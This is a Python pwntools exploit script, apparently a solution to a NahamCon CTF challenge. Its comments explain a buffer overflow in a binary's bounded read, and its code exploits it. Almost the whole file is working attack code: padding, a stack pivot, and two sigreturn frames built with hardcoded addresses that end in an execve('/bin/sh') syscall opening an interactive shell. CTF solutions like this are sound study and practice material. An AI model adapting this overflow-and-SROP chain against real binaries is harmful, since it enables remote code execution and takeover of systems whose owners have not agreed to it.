#!/usr/bin/env python3

#Even though the binary has a read that has a bound check ..The arguements for the read are given in such a way that it suffers from bof
#This challenge is from NahamCon CTF was really challenging 
#It has a syscall gadget but with no way of controlling registers
#So only way to get Remote Code Execution is to perform Sigrop
#But this program made everything complex for a normal SigRop
#So I went with a idea to perform 2 Sigreturn syscalls
#One to make read and stack pivot and then the next Sigreturn to setup for execve
#And then finally perform execve syscall with /bin/sh as arguement 


from pwn import *
import time


r = process("./some-really-ordinary-program")       #Nahamcon kinda stopped the container for the remote server so made it as process 
context.clear(arch='amd64')
def frame():                                      #Frame to perform the read syscall
    frame = SigreturnFrame(kernel="amd64")     
    frame.rax = 0
    frame.rdi = 0
    frame.rsi = 0x402040
    frame.rdx = 16
    frame.rsp = 0x402048
    frame.rip = 0x40100e
    frame.rbp = 0x402050
    return bytes(frame)

def frame2():                                    #Frame to perform the syscall
    frame2 = SigreturnFrame(kernel='amd64')
    frame2.rax = 0x3b
    frame2.rdi = 0x402040
    frame2.rsi = 0
    frame2.rdx = 0
    frame2.rsp = 0x402048
    frame2.rip = 0x40100e
    return bytes(frame2)

Frame = frame()
Frame2 = frame2()
payload1 = b'A' * 0x1f4               #Padding 
payload1+=p64(0x402080)               #Stack pivot after leave instruction
payload1+=p64(0x401023)               #Address to return after ret instruction
payload1+=p64(0x40100e) * 2           #Address of syscall instruction
payload1+=Frame                       #First Sigreturn Frame to perform read
payload1+=b'B' * 35         #Padding to fill up read and the remaining 15 B's to next read to setup the rax value to 15
r.send(payload1)            #Send the first  payload 
time.sleep(0.2)             #Slight time difference to second the next payload
payload2 = b'/bin/sh\x00'   #/bin/sh in .bss 
payload2+=p64(0x401041)     #Return address to make read again to setup our way to next Sigreturn Frame
r.send(payload2)            #Send the second payload
time.sleep(0.2)             #Time difference again for sending the input
payload3 = p64(0x402060)    #The third payload is to make multiple stack pivots and multiple returns 
payload3+=p64(0x401041)
payload3+=p64(0x402078)
payload3+=b'A' * 7
payload3+=p8(0)
payload3+=p64(0x40100e)
payload3+=Frame2 
r.send(payload3)         #Send the third payload
time.sleep(0.2)          #Time difference again for the input
payload4 = p64(0x402068) #The final payload to finally perform the final Sigreturn to make the execve syscall
payload4+=b'\x5b\x10\x40\x00\x00\x00\x00' 
r.send(payload4)         #Send the final payload to get the much awaited shell
r.recv()                 #Just to clean the output before shell pops up
r.interactive()          #Shelll
